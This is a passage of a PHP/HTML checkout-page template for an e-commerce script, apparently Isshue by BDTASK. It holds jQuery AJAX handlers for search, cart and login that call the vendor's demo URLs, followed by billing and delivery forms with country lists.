

<!DOCTYPE html>
<html lang="en">
    
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="author" content="BDTASK">
        <meta name="description" content="">

        <title>Home</title>
   
        <!-- Favicons --> 
        <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
        
        <!-- Bootstrap core CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <!-- Bootstrap core CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
        
        <!-- FontAwesome Icon CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/font-awesome/css/font-awesome.min.css'?>" rel="stylesheet" type="text/css"> 
        
        <!-- Jquery UI CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.css'?>" rel="stylesheet"> 
        
        <!-- Owl Carousel CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.css'?>" rel="stylesheet">
        
        <!-- Animate CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/wow-js/animate.css'?>" rel="stylesheet"> 
        
        <!-- Lightbox CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/lightbox/css/lightbox.min.css'?>" rel="stylesheet"> 

        <!-- Custom styles for this template -->
        <link href="<?php echo base_url().'assets/website/css/style.css'?>" rel="stylesheet"> 
        <!-- EasyZoom CSS -->
        <link rel="stylesheet" href="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.css'?>">

        <!-- Responsive Style -->
        <link href="<?php echo base_url().'assets/website/css/responsive.css'?>" rel="stylesheet">

        <!-- Include SmartWizard CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard.css'?>" rel="stylesheet" type="text/css">

        <!-- Optional SmartWizard theme -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard_theme_dots.css'?>" rel="stylesheet" type="text/css">

        <!-- Jquery  -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery/jquery-3.2.1.min.js'?>" type="text/javascript"></script>

        <!-- jquery-ui.min.js -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

     
    
    </head>

    <body>
        <!--==== Preloader =======-->
        <div class="preloader"></div>

        <!--========== Header Top Area ==========-->
       <?php      $this->load->view('header_top');             ?> 
        <!--========== End Header Top Area ==========-->
        
        <!--====== Header Area ======-->
<header>
    <!-- Main Header Area -->
   <?php      $this->load->view('header_main');             ?> 
    

    <!-- header bottom end -->
</header>
<!--===== End Header Area =======-->

    <style type="text/css">
        input.loading {
            background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
        }
    </style>

    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
        
        //Product search by product name
        $('body').on('keyup', '#product_name', function() {

            var product_name = $('#product_name').val();
            var category_id  = $('#select_category').val();

            //Product name check
            if (product_name == 0) {
                $('.search_results').html(' ');
                return false;
            }
            
            $.ajax({
                type: "post",
                async: false,
                url: 'http://isshue.bdtask.com/isshue-v1.5/website/Category/category_product_search_ajax',
                data: {product_name: product_name,category_id:category_id},
                beforeSend: function(){
                    $('#product_name').addClass('loading');
                },
                success: function(data) {
                    $('#product_name').removeClass('loading');
                    if (data) {
                        $('.search_results').html(data);
                    }
                },
                error: function() {
                    alert('Request Failed, Please check your code and try again!');
                }
            });
        });
    </script>

<!-- Product delete from cart by ajax -->
<script type="text/javascript">
    $('body').on('click', '.delete_cart_item', function() {
        var row_id  = $(this).attr('name');
        $.ajax({
            type: "post",
            async: true,
            url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/delete_cart/',
            data: {row_id:row_id},
            success: function(data) {
                $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    });  
</script>           



<!--========== End Overview Area ==========-->

 <center><h1>ini content</h1><hr></center>
        
<!-- ========== CheckOut Area -->
<!-- ========== CheckOut Area -->
<section class="checkout">
    <div class="container">

        <!-- Alert Message -->
                <form action="http://isshue.bdtask.com/isshue-v1.5/submit_checkout" id="myForm" role="form" data-toggle="validator" method="post" accept-charset="utf-8" >

            <!-- SmartWizard html -->
            <div id="wizard_form">
                <ul>
                                        <li><a href="#step-1">Checkout Options</a></li>
                                        <li><a href="#step-2">Billing Details</a></li>
                    <li><a href="#step-3">Delivery Details</a></li>
                    <li><a href="#step-4">Delivery Method</a></li>
                    <li><a href="#step-5">Payment Method</a></li>
                    <li><a href="#step-6">Confirm Order</a></li>
                </ul>

                <div class="wizard_inner">
                    <div id="step-1">
                        <div id="form-step-0" role="form" data-toggle="validator" class="step1_inner">
                            <h2 class="new_user">New Customer</h2>
                            <p>Checkout Options:</p>
                            <div class="form-group">
                                <div class="">
                                    <label>         
                                        <input type="radio" name="account" value="1"  onclick="account_type()"> Register Account                                    </label>
                                </div>
                                <div class="">
                                    <label>     
                                        <input type="radio" name="account" value="2"  onclick="account_type()"> Guest Checkout                                    </label>
                                </div>
                                <div class="help-block with-errors"></div>
                            </div>

                            <p class="div_ender">By creating an account you will be able to shop faster, be up to date on an order's status, and keep track of the orders you have previously made.</p>
                            <h2 class="old_user">Returning Customer</h2>

                            <div class="form-group">
                                <label for="login_email">Email:</label>
                                <input type="email" class="form-control" name="email" id="login_email" placeholder="Email">
                            </div>

                            <div class="form-group">
                                <label for="password">Password:</label>
                                <input type="password" class="form-control" name="password" id="login_password" placeholder="Password">
                            </div>

                            <div class="form-group">
                                <label for="password"></label>
                                <button type="button" class="btn btn-success customer_login">Login</button>
                            </div>

                        </div>
                    </div>

                    
                    <!-- Customer login by ajax start-->
                    <script type="text/javascript">
                        //Retrive district
                        $('body').on('click', '.customer_login', function() {
                            var login_email    = $('#login_email').val();
                            var login_password = $('#login_password').val();

                            if (login_email == 0 || login_password == 0) {
                                alert('Please type email and password.');
                                return false;
                            }
                            $.ajax({
                                type: "post",
                                async: true,
                                url: 'http://isshue.bdtask.com/isshue-v1.5/website/customer/Login/checkout_login',
                                data: {login_email:login_email,login_password:login_password},
                                success: function(data) {
                                    if (data == 'true') {
                                        location.reload();
                                        $('#wizard_form').smartWizard('next');
                                    }else{
                                        location.reload();
                                    }
                                },
                                error: function() {
                                    alert('Request Failed, Please check your code and try again!');
                                }
                            });
                        }); 
                    </script>
                    <!-- Customer login by ajax start-->

                    <div id="step-2">
                        <h2>Personal Details</h2>
                        <div id="form-step-1" role="form" data-toggle="validator" class="row step2_inner">
                            <div class="form-group col-sm-6">
                                <label for="first_name" class="control_label">First Name * :</label>
                                <input type="text" class="form-control" name="first_name" id="first_name" placeholder="First Name" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="last_name" class="control_label">Last Name * :</label>
                                <input type="text" class="form-control" name="last_name" id="last_name" placeholder="Last Name" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="customer_email" class="control_label">Customer Email * :</label>
                                <input type="email" class="form-control" name="customer_email" id="customer_email" placeholder="Customer Email" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="customer_mobile" class="control_label">Customer Mobile * :</label>
                                <input type="text" class="form-control" name="customer_mobile" id="customer_mobile" placeholder="Customer Mobile" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="customer_address_1" class="control-label">Address 1 * : </label>
                                <input type="text" placeholder="Address 1" name="customer_address_1" id="customer_address_1" class="form-control" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="customer_address_2" class="control-label">Address 2 : </label>
                                <input type="text" name="customer_address_2" id="customer_address_2" placeholder="Address 2" class="form-control" value="">
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="company" class="control-label">Company : </label>
                                <input type="text" name="company" id="company" placeholder="Company" class="form-control" value="">
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="city" class="control-label">City * :</label>
                                <input type="text" name="city" id="city" placeholder="City" class="form-control" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="zip" class="control-label">Zip * :</label>
                                <input type="text" name="zip" id="zip" placeholder="Zip" class="form-control" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label class="control-label" for="country">Country * : </label>
                                <select name="country" id="country" class="form-control" required>
                                    <option value=""> --- Select Category --- </option>
                                                                        <option value="1" >Afghanistan </option>
                                                                        <option value="2" >Albania </option>
                                                                        <option value="3" >Algeria </option>
                                                                        <option value="4" >American Samoa </option>
                                                                        <option value="5" >Andorra </option>
                                                                        <option value="6" >Angola </option>
                                                                        <option value="7" >Anguilla </option>
                                                                        <option value="8" >Antarctica </option>
                                                                        <option value="9" >Antigua And Barbuda </option>
                                                                        <option value="10" >Argentina </option>
                                                                        <option value="11" >Armenia </option>
                                                                        <option value="12" >Aruba </option>
                                                                        <option value="13" >Australia </option>
                                                                        <option value="14" >Austria </option>
                                                                        <option value="15" >Azerbaijan </option>
                                                                        <option value="16" >Bahamas The </option>
                                                                        <option value="17" >Bahrain </option>
                                                                        <option value="18" >Bangladesh </option>
                                                                        <option value="19" >Barbados </option>
                                                                        <option value="20" >Belarus </option>
                                                                        <option value="21" >Belgium </option>
                                                                        <option value="22" >Belize </option>
                                                                        <option value="23" >Benin </option>
                                                                        <option value="24" >Bermuda </option>
                                                                        <option value="25" >Bhutan </option>
                                                                        <option value="26" >Bolivia </option>
                                                                        <option value="27" >Bosnia and Herzegovina </option>
                                                                        <option value="28" >Botswana </option>
                                                                        <option value="29" >Bouvet Island </option>
                                                                        <option value="30" >Brazil </option>
                                                                        <option value="31" >British Indian Ocean Territory </option>
                                                                        <option value="32" >Brunei </option>
                                                                        <option value="33" >Bulgaria </option>
                                                                        <option value="34" >Burkina Faso </option>
                                                                        <option value="35" >Burundi </option>
                                                                        <option value="36" >Cambodia </option>
                                                                        <option value="37" >Cameroon </option>
                                                                        <option value="38" >Canada </option>
                                                                        <option value="39" >Cape Verde </option>
                                                                        <option value="40" >Cayman Islands </option>
                                                                        <option value="41" >Central African Republic </option>
                                                                        <option value="42" >Chad </option>
                                                                        <option value="43" >Chile </option>
                                                                        <option value="44" >China </option>
                                                                        <option value="45" >Christmas Island </option>
                                                                        <option value="46" >Cocos (Keeling) Islands </option>
                                                                        <option value="47" >Colombia </option>
                                                                        <option value="48" >Comoros </option>
                                                                        <option value="49" >Republic Of The Congo </option>
                                                                        <option value="50" >Democratic Republic Of The Congo </option>
                                                                        <option value="51" >Cook Islands </option>
                                                                        <option value="52" >Costa Rica </option>
                                                                        <option value="53" >Cote D'Ivoire (Ivory Coast) </option>
                                                                        <option value="54" >Croatia (Hrvatska) </option>
                                                                        <option value="55" >Cuba </option>
                                                                        <option value="56" >Cyprus </option>
                                                                        <option value="57" >Czech Republic </option>
                                                                        <option value="58" >Denmark </option>
                                                                        <option value="59" >Djibouti </option>
                                                                        <option value="60" >Dominica </option>
                                                                        <option value="61" >Dominican Republic </option>
                                                                        <option value="62" >East Timor </option>
                                                                        <option value="63" >Ecuador </option>
                                                                        <option value="64" >Egypt </option>
                                                                        <option value="65" >El Salvador </option>
                                                                        <option value="66" >Equatorial Guinea </option>
                                                                        <option value="67" >Eritrea </option>
                                                                        <option value="68" >Estonia </option>
                                                                        <option value="69" >Ethiopia </option>
                                                                        <option value="70" >External Territories of Australia </option>
                                                                        <option value="71" >Falkland Islands </option>
                                                                        <option value="72" >Faroe Islands </option>
                                                                        <option value="73" >Fiji Islands </option>
                                                                        <option value="74" >Finland </option>
                                                                        <option value="75" >France </option>
                                                                        <option value="76" >French Guiana </option>
                                                                        <option value="77" >French Polynesia </option>
                                                                        <option value="78" >French Southern Territories </option>
                                                                        <option value="79" >Gabon </option>
                                                                        <option value="80" >Gambia The </option>
                                                                        <option value="81" >Georgia </option>
                                                                        <option value="82" >Germany </option>
                                                                        <option value="83" >Ghana </option>
                                                                        <option value="84" >Gibraltar </option>
                                                                        <option value="85" >Greece </option>
                                                                        <option value="86" >Greenland </option>
                                                                        <option value="87" >Grenada </option>
                                                                        <option value="88" >Guadeloupe </option>
                                                                        <option value="89" >Guam </option>
                                                                        <option value="90" >Guatemala </option>
                                                                        <option value="91" >Guernsey and Alderney </option>
                                                                        <option value="92" >Guinea </option>
                                                                        <option value="93" >Guinea-Bissau </option>
                                                                        <option value="94" >Guyana </option>
                                                                        <option value="95" >Haiti </option>
                                                                        <option value="96" >Heard and McDonald Islands </option>
                                                                        <option value="97" >Honduras </option>
                                                                        <option value="98" >Hong Kong S.A.R. </option>
                                                                        <option value="99" >Hungary </option>
                                                                        <option value="100" >Iceland </option>
                                                                        <option value="101" >India </option>
                                                                        <option value="102" >Indonesia </option>
                                                                        <option value="103" >Iran </option>
                                                                        <option value="104" >Iraq </option>
                                                                        <option value="105" >Ireland </option>
                                                                        <option value="106" >Israel </option>
                                                                        <option value="107" >Italy </option>
                                                                        <option value="108" >Jamaica </option>
                                                                        <option value="109" >Japan </option>
                                                                        <option value="110" >Jersey </option>
                                                                        <option value="111" >Jordan </option>
                                                                        <option value="112" >Kazakhstan </option>
                                                                        <option value="113" >Kenya </option>
                                                                        <option value="114" >Kiribati </option>
                                                                        <option value="115" >Korea North </option>
                                                                        <option value="116" >Korea South </option>
                                                                        <option value="117" >Kuwait </option>
                                                                        <option value="118" >Kyrgyzstan </option>
                                                                        <option value="119" >Laos </option>
                                                                        <option value="120" >Latvia </option>
                                                                        <option value="121" >Lebanon </option>
                                                                        <option value="122" >Lesotho </option>
                                                                        <option value="123" >Liberia </option>
                                                                        <option value="124" >Libya </option>
                                                                        <option value="125" >Liechtenstein </option>
                                                                        <option value="126" >Lithuania </option>
                                                                        <option value="127" >Luxembourg </option>
                                                                        <option value="128" >Macau S.A.R. </option>
                                                                        <option value="129" >Macedonia </option>
                                                                        <option value="130" >Madagascar </option>
                                                                        <option value="131" >Malawi </option>
                                                                        <option value="132" >Malaysia </option>
                                                                        <option value="133" >Maldives </option>
                                                                        <option value="134" >Mali </option>
                                                                        <option value="135" >Malta </option>
                                                                        <option value="136" >Man (Isle of) </option>
                                                                        <option value="137" >Marshall Islands </option>
                                                                        <option value="138" >Martinique </option>
                                                                        <option value="139" >Mauritania </option>
                                                                        <option value="140" >Mauritius </option>
                                                                        <option value="141" >Mayotte </option>
                                                                        <option value="142" >Mexico </option>
                                                                        <option value="143" >Micronesia </option>
                                                                        <option value="144" >Moldova </option>
                                                                        <option value="145" >Monaco </option>
                                                                        <option value="146" >Mongolia </option>
                                                                        <option value="147" >Montserrat </option>
                                                                        <option value="148" >Morocco </option>
                                                                        <option value="149" >Mozambique </option>
                                                                        <option value="150" >Myanmar </option>
                                                                        <option value="151" >Namibia </option>
                                                                        <option value="152" >Nauru </option>
                                                                        <option value="153" >Nepal </option>
                                                                        <option value="154" >Netherlands Antilles </option>
                                                                        <option value="155" >Netherlands The </option>
                                                                        <option value="156" >New Caledonia </option>
                                                                        <option value="157" >New Zealand </option>
                                                                        <option value="158" >Nicaragua </option>
                                                                        <option value="159" >Niger </option>
                                                                        <option value="160" >Nigeria </option>
                                                                        <option value="161" >Niue </option>
                                                                        <option value="162" >Norfolk Island </option>
                                                                        <option value="163" >Northern Mariana Islands </option>
                                                                        <option value="164" >Norway </option>
                                                                        <option value="165" >Oman </option>
                                                                        <option value="166" >Pakistan </option>
                                                                        <option value="167" >Palau </option>
                                                                        <option value="168" >Palestinian Territory Occupied </option>
                                                                        <option value="169" >Panama </option>
                                                                        <option value="170" >Papua new Guinea </option>
                                                                        <option value="171" >Paraguay </option>
                                                                        <option value="172" >Peru </option>
                                                                        <option value="173" >Philippines </option>
                                                                        <option value="174" >Pitcairn Island </option>
                                                                        <option value="175" >Poland </option>
                                                                        <option value="176" >Portugal </option>
                                                                        <option value="177" >Puerto Rico </option>
                                                                        <option value="178" >Qatar </option>
                                                                        <option value="179" >Reunion </option>
                                                                        <option value="180" >Romania </option>
                                                                        <option value="181" >Russia </option>
                                                                        <option value="182" >Rwanda </option>
                                                                        <option value="183" >Saint Helena </option>
                                                                        <option value="184" >Saint Kitts And Nevis </option>
                                                                        <option value="185" >Saint Lucia </option>
                                                                        <option value="186" >Saint Pierre and Miquelon </option>
                                                                        <option value="187" >Saint Vincent And The Grenadines </option>
                                                                        <option value="188" >Samoa </option>
                                                                        <option value="189" >San Marino </option>
                                                                        <option value="190" >Sao Tome and Principe </option>
                                                                        <option value="191" >Saudi Arabia </option>
                                                                        <option value="192" >Senegal </option>
                                                                        <option value="193" >Serbia </option>
                                                                        <option value="194" >Seychelles </option>
                                                                        <option value="195" >Sierra Leone </option>
                                                                        <option value="196" >Singapore </option>
                                                                        <option value="197" >Slovakia </option>
                                                                        <option value="198" >Slovenia </option>
                                                                        <option value="199" >Smaller Territories of the UK </option>
                                                                        <option value="200" >Solomon Islands </option>
                                                                        <option value="201" >Somalia </option>
                                                                        <option value="202" >South Africa </option>
                                                                        <option value="203" >South Georgia </option>
                                                                        <option value="204" >South Sudan </option>
                                                                        <option value="205" >Spain </option>
                                                                        <option value="206" >Sri Lanka </option>
                                                                        <option value="207" >Sudan </option>
                                                                        <option value="208" >Suriname </option>
                                                                        <option value="209" >Svalbard And Jan Mayen Islands </option>
                                                                        <option value="210" >Swaziland </option>
                                                                        <option value="211" >Sweden </option>
                                                                        <option value="212" >Switzerland </option>
                                                                        <option value="213" >Syria </option>
                                                                        <option value="214" >Taiwan </option>
                                                                        <option value="215" >Tajikistan </option>
                                                                        <option value="216" >Tanzania </option>
                                                                        <option value="217" >Thailand </option>
                                                                        <option value="218" >Togo </option>
                                                                        <option value="219" >Tokelau </option>
                                                                        <option value="220" >Tonga </option>
                                                                        <option value="221" >Trinidad And Tobago </option>
                                                                        <option value="222" >Tunisia </option>
                                                                        <option value="223" >Turkey </option>
                                                                        <option value="224" >Turkmenistan </option>
                                                                        <option value="225" >Turks And Caicos Islands </option>
                                                                        <option value="226" >Tuvalu </option>
                                                                        <option value="227" >Uganda </option>
                                                                        <option value="228" >Ukraine </option>
                                                                        <option value="229" >United Arab Emirates </option>
                                                                        <option value="230" >United Kingdom </option>
                                                                        <option value="231" >United States </option>
                                                                        <option value="232" >United States Minor Outlying Islands </option>
                                                                        <option value="233" >Uruguay </option>
                                                                        <option value="234" >Uzbekistan </option>
                                                                        <option value="235" >Vanuatu </option>
                                                                        <option value="236" >Vatican City State (Holy See) </option>
                                                                        <option value="237" >Venezuela </option>
                                                                        <option value="238" >Vietnam </option>
                                                                        <option value="239" >Virgin Islands (British) </option>
                                                                        <option value="240" >Virgin Islands (US) </option>
                                                                        <option value="241" >Wallis And Futuna Islands </option>
                                                                        <option value="242" >Western Sahara </option>
                                                                        <option value="243" >Yemen </option>
                                                                        <option value="244" >Yugoslavia </option>
                                                                        <option value="245" >Zambia </option>
                                                                        <option value="246" >Zimbabwe </option>
                                                                    </select>
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label class="control-label" for="state">State * : </label>
                                <select name="state" id="state" class="form-control" required>
                                    <option value=""> --- Select State --- </option>
                                    
                                </select>
                                <div class="help-block with-errors"></div>
                            </div>

                                                        <div class="form-group col-sm-6"></div>
                            
                            <div class="form-group col-sm-6">
                                <input name="ship_and_bill" type="checkbox" id="ship_and_bill"  onclick="checkboxcheck()"> My delivery and billing addresses are the same.  
                                <br>
                                <input name="privacy_policy" type="checkbox" required="" id="privacy_policy"   onclick="checkboxcheck_privacy()"> I have read and agree to the <a href="http://isshue.bdtask.com/isshue-v1.5/privacy_policy" class="" target="_blank"><b>Privacy Policy</b></a>.
                                <div class="help-block with-errors"></div>
                            </div>
                        </div>
                    </div>
                
                    <div id="step-3">
                        <h2>Delivery Details</h2>
                        <div id="form-step-2" role="form" data-toggle="validator" class="row step2_inner">
                            <div class="form-group col-sm-6">
                                <label for="ship_first_name" class="control-label">First Name * :</label>
                                <input type="text" name="ship_first_name" id="ship_first_name" placeholder="First Name" class="form-control" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="ship_last_name" class="control-label">Last Name * :</label>
                                <input type="text" name="ship_last_name" id="ship_last_name" placeholder="Last Name" class="form-control" required value="">
                            </div>   
                            <div class="form-group col-sm-6">
                                <label for="ship_mobile" class="control-label">Mobile * :</label>
                                <input type="text" name="ship_mobile" id="ship_mobile" placeholder="Mobile" class="form-control" required value="">
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="ship_company" class="control-label">Company :</label>
                                <input type="text" name="ship_company" id="ship_company" placeholder="Company" class="form-control" value="">
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="ship_address_1" class="control-label">Address 1 * :</label>
                                <input type="text" name="ship_address_1" id="ship_address_1" placeholder="Address 1" class="form-control" required value="">
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="ship_address_2" class="control-label">Address 2 :</label>
                                <input type="text" name="ship_address_2" id="ship_address_2" placeholder="Address 2" class="form-control" value="">
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="ship_city" class="control-label">City :</label>
                                <input type="text" name="ship_city" id="ship_city" class="form-control" placeholder="City" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="ship_zip" class="control-label">Zip * :</label>
                                <input type="text" name="ship_zip" id="ship_zip" placeholder="Zip" class="form-control" required value="">
                                <div class="help-block with-errors"></div>
                            </div>
                            <div class="form-group col-sm-6">
                                <label for="ship_country" class="control-label">Country * : </label>
                                <select name="ship_country" id="ship_country" class="form-control">
                                    <option value=""> --- Select Country --- </option>
                                                                        <option value="1" >Afghanistan </option>
                                                                        <option value="2" >Albania </option>
                                                                        <option value="3" >Algeria </option>
                                                                        <option value="4" >American Samoa </option>
                                                                        <option value="5" >Andorra </option>
                                                                        <option value="6" >Angola </option>
                                                                        <option value="7" >Anguilla </option>
                                                                        <option value="8" >Antarctica </option>
                                                                        <option value="9" >Antigua And Barbuda </option>
                                                                        <option value="10" >Argentina </option>
                                                                        <option value="11" >Armenia </option>
                                                                        <option value="12" >Aruba </option>
                                                                        <option value="13" >Australia </option>
                                                                        <option value="14" >Austria </option>
                                                                        <option value="15" >Azerbaijan </option>
                                                                        <option value="16" >Bahamas The </option>
                                                                        <option value="17" >Bahrain </option>
                                                                        <option value="18" >Bangladesh </option>
                                                                        <option value="19" >Barbados </option>
                                                                        <option value="20" >Belarus </option>
                                                                        <option value="21" >Belgium </option>
                                                                        <option value="22" >Belize </option>
                                                                        <option value="23" >Benin </option>
                                                                        <option value="24" >Bermuda </option>
                                                                        <option value="25" >Bhutan </option>
                                                                        <option value="26" >Bolivia </option>
                                                                        <option value="27" >Bosnia and Herzegovina </option>
                                                                        <option value="28" >Botswana </option>
                                                                        <option value="29" >Bouvet Island </option>
                                                                        <option value="30" >Brazil </option>
                                                                        <option value="31" >British Indian Ocean Territory </option>
                                                                        <option value="32" >Brunei </option>
                                                                        <option value="33" >Bulgaria </option>
                                                                        <option value="34" >Burkina Faso </option>
                                                                        <option value="35" >Burundi </option>
                                                                        <option value="36" >Cambodia </option>
                                                                        <option value="37" >Cameroon </option>
                                                                        <option value="38" >Canada </option>
                                                                        <option value="39" >Cape Verde </option>
                                                                        <option value="40" >Cayman Islands </option>
                                                                        <option value="41" >Central African Republic </option>
                                                                        <option value="42" >Chad </option>
                                                                        <option value="43" >Chile </option>
                                                                        <option value="44" >China </option>
                                                                        <option value="45" >Christmas Island </option>
                                                                        <option value="46" >Cocos (Keeling) Islands </option>
                                                                        <option value="47" >Colombia </option>
                                                                        <option value="48" >Comoros </option>
                                                                        <option value="49" >Republic Of The Congo </option>
                                                                        <option value="50" >Democratic Republic Of The Congo </option>
                                                                        <option value="51" >Cook Islands </option>
                                                                        <option value="52" >Costa Rica </option>
                                                                        <option value="53" >Cote D'Ivoire (Ivory Coast) </option>
                                                                        <option value="54" >Croatia (Hrvatska) </option>
                                                                        <option value="55" >Cuba </option>
                                                                        <option value="56" >Cyprus </option>
                                                                        <option value="57" >Czech Republic </option>
                                                                        <option value="58" >Denmark </option>
                                                                        <option value="59" >Djibouti </option>
                                                                        <option value="60" >Dominica </option>
                                                                        <option value="61" >Dominican Republic </option>
                                                                        <option value="62" >East Timor </option>
                                                                        <option value="63" >Ecuador </option>
                                                                        <option value="64" >Egypt </option>
                                                                        <option value="65" >El Salvador </option>
                                                                        <option value="66" >Equatorial Guinea </option>
                                                                        <option value="67" >Eritrea </option>
                                                                        <option value="68" >Estonia </option>
                                                                        <option value="69" >Ethiopia </option>
                                                                        <option value="70" >External Territories of Australia </option>
                                                                        <option value="71" >Falkland Islands </option>
                                                                        <option value="72" >Faroe Islands </option>
                                                                        <option value="73" >Fiji Islands </option>
                                                                        <option value="74" >Finland </option>
                                                                        <option value="75" >France </option>
                                                                        <option value="76" >French Guiana </option>
                                                                        <option value="77" >French Polynesia </option>
                                                                        <option value="78" >French Southern Territories </option>
                                                                        <option value="79" >Gabon </option>
                                                                        <option value="80" >Gambia The </option>
                                                                        <option value="81" >Georgia </option>
                                                                        <option value="82" >Germany </option>
                                                                        <option value="83" >Ghana </option>
                                                                        <option value="84" >Gibraltar </option>
                                                                        <option value="85" >Greece </option>
                                                                        <option value="86" >Greenland </option>
                                                                        <option value="87" >Grenada </option>
                                                                        <option value="88" >Guadeloupe </option>
                                                                        <option value="89" >Guam </option>
                                                                        <option value="90" >Guatemala </option>
                                                                        <option value="91" >Guernsey and Alderney </option>
                                                                        <option value="92" >Guinea </option>
                                                                        <option value="93" >Guinea-Bissau </option>
                                                                        <option value="94" >Guyana </option>
                                                                        <option value="95" >Haiti </option>
                                                                        <option value="96" >Heard and McDonald Islands </option>
                                                                        <option value="97" >Honduras </option>
                                                                        <option value="98" >Hong Kong S.A.R. </option>
                                                                        <option value="99" >Hungary </option>
                                                                        <option value="100" >Iceland </option>
                                                                        <option value="101" >India </option>
                                                                        <option value="102" >Indonesia </option>
                                                                        <option value="103" >Iran </option>
                                                                        <option value="104" >Iraq </option>
                                                                        <option value="105" >Ireland </option>
                                                                        <option value="106" >Israel </option>
                                                                        <option value="107" >Italy </option>
                                                                        <option value="108" >Jamaica </option>
                                                                        <option value="109" >Japan </option>
                                                                        <option value="110" >Jersey </option>
                                                                        <option value="111" >Jordan </option>
                                                                        <option value="112" >Kazakhstan </option>
                                                                        <option value="113" >Kenya </option>
                                                                        <option value="114" >Kiribati </option>
                                                                        <option value="115" >Korea North </option>
                                                                        <option value="116" >Korea South </option>
                                                                        <option value="117" >Kuwait </option>
                                                                        <option value="118" >Kyrgyzstan </option>
                                                                        <option value="119" >Laos </option>
                                                                        <option value="120" >Latvia </option>
                                                                        <option value="121" >Lebanon </option>
                                                                        <option value="122" >Lesotho </option>
                                                                        <option value="123" >Liberia </option>
                                                                        <option value="124" >Libya </option>
                                                                        <option value="125" >Liechtenstein </option>
                                                                        <option value="126" >Lithuania </option>
                                                                        <option value="127" >Luxembourg </option>
                                                                        <option value="128" >Macau S.A.R. </option>
                                                                        <option value="129" >Macedonia </option>
                                                                        <option value="130" >Madagascar </option>
                                                                        <option value="131" >Malawi </option>
                                                                        <option value="132" >Malaysia </option>
                                                                        <option value="133" >Maldives </option>
                                                                        <option value="134" >Mali </option>
                                                                        <option value="135" >Malta </option>
                                                                        <option value="136" >Man (Isle of) </option>
                                                                        <option value="137" >Marshall Islands </option>
                                                                        <option value="138" >Martinique </option>
                                                                        <option value="139" >Mauritania </option>
                                                                        <option value="140" >Mauritius </option>
                                                                        <option value="141" >Mayotte </option>
                                                                        <option value="142" >Mexico </option>
                                                                        <option value="143" >Micronesia </option>
                                                                        <option value="144" >Moldova </option>
                                                                        <option value="145" >Monaco </option>
                                                                        <option value="146" >Mongolia </option>
                                                                        <option value="147" >Montserrat </option>
                                                                        <option value="148" >Morocco </option>
                                                                        <option value="149" >Mozambique </option>
                                                                        <option value="150" >Myanmar </option>
                                                                        <option value="151" >Namibia </option>
                                                                        <option value="152" >Nauru </option>
                                                                        <option value="153" >Nepal </option>
                                                                        <option value="154" >Netherlands Antilles </option>
                                                                        <option value="155" >Netherlands The </option>
                                                                        <option value="156" >New Caledonia </option>
                                                                        <option value="157" >New Zealand </option>
                                                                        <option value="158" >Nicaragua </option>
                                                                        <option value="159" >Niger </option>
                                                                        <option value="160" >Nigeria </option>
                                                                        <option value="161" >Niue </option>
                                                                        <option value="162" >Norfolk Island </option>
                                                                        <option value="163" >Northern Mariana Islands </option>
                                                                        <option value="164" >Norway </option>
                                                                        <option value="165" >Oman </option>
                                                                        <option value="166" >Pakistan </option>
                                                                        <option value="167" >Palau </option>
                                                                        <option value="168" >Palestinian Territory Occupied </option>
